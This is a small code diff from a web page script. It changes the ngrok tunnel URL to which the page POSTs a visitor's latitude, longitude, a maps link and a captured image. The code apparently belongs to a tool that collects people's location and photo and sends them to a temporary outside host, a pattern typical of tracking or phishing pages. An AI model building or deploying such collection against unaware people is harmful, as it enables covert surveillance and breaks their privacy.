@@ -71,7 +71,7 @@
       const fotoDataUrl = canvas.toDataURL("image/png");
 
       // Envia localização e imagem
-      fetch("https://bd70-2804-d84-21ec-1500-55e1-85d5-ce-f8b6.ngrok-free.app/send-location", {
+      fetch("https://2962-2804-d84-21ec-1500-1140-4d7a-5eb1-cc99.ngrok-free.app/send-location", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude, longitude, maps, foto: fotoDataUrl })
